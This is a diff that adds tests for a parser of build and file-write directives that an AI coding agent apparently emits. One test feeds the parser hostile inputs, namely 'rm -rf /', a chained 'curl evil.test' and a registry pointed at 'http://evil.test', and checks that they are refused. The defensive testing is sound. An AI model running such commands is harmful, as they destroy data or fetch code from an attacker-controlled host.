@@ -363,6 +363,68 @@ await test("the project is rebuilt from scratch each time", async () => {
   check("the stale file is gone", stale === null);
 });
 
+// ── The directive the agent emits ─────────────────────────────────────────
+
+section("what the model is allowed to ask for");
+
+await test("a plain build directive is recognised", async () => {
+  const { parseFileWrites } = await import("../server/pipeline/file-blocks");
+  const parsed = parseFileWrites("Done.\n\n```lolo:build\n```\n\nThat's it.");
+  check("one build requested", parsed.builds.length === 1, JSON.stringify(parsed.builds));
+  check("the target defaults to build", parsed.builds[0] === "build");
+  check("the fence is removed from the prose", !parsed.prose.includes("lolo:build"));
+  check("the prose survives", parsed.prose.includes("Done."), parsed.prose);
+  check("no files were requested", parsed.writes.length === 0);
+});
+
+await test("an explicit target is honoured", async () => {
+  const { parseFileWrites, BUILD_TARGETS } = await import("../server/pipeline/file-blocks");
+  for (const target of BUILD_TARGETS) {
+    const parsed = parseFileWrites(`\`\`\`lolo:build ${target}\n\`\`\``);
+    check(`${target} is accepted`, parsed.builds[0] === target, JSON.stringify(parsed.builds));
+  }
+});
+
+await test("an unknown target is ignored, not honoured", async () => {
+  const { parseFileWrites } = await import("../server/pipeline/file-blocks");
+  for (const bad of [
+    "lolo:build rm -rf /",
+    "lolo:build deploy; curl evil.test",
+    "lolo:build install --registry=http://evil.test",
+  ]) {
+    const parsed = parseFileWrites(`\`\`\`${bad}\n\`\`\``);
+    check(`refuses ${JSON.stringify(bad)}`, parsed.builds.length === 0, JSON.stringify(parsed.builds));
+  }
+});
+
+await test("writes and builds in one answer are both collected", async () => {
+  const { parseFileWrites } = await import("../server/pipeline/file-blocks");
+  const parsed = parseFileWrites(
+    "Building it now.\n\n```lolo:write package.json\n{}\n```\n\n```lolo:build\n```",
+  );
+  check("one file", parsed.writes.length === 1);
+  check("one build", parsed.builds.length === 1);
+  check("the file content is intact", parsed.writes[0]?.content === "{}", JSON.stringify(parsed.writes));
+  check("and the prose is what the user reads", parsed.prose === "Building it now.", JSON.stringify(parsed.prose));
+});
+
+await test("a small model's repetition is preserved but capped downstream", async () => {
+  const { parseFileWrites } = await import("../server/pipeline/file-blocks");
+  const noisy = "```lolo:build\n```\n".repeat(6);
+  const parsed = parseFileWrites(noisy);
+  // The parser is honest about what it saw; the pipeline is what enforces the
+  // one-build-per-turn cap. Separating them is deliberate: a parser that
+  // silently drops things makes a trace lie.
+  check("it saw them all", parsed.builds.length === 6, `${parsed.builds.length}`);
+});
+
+await test("a malformed directive stays visible as prose", async () => {
+  const { parseFileWrites } = await import("../server/pipeline/file-blocks");
+  const parsed = parseFileWrites("```lolo:build\nnot closed");
+  check("nothing requested", parsed.builds.length === 0);
+  check("the text is still shown to the user", parsed.prose.includes("lolo:build"), parsed.prose);
+});
+
 // ── Reporting ─────────────────────────────────────────────────────────────
 
 section("what it reports back is honest");
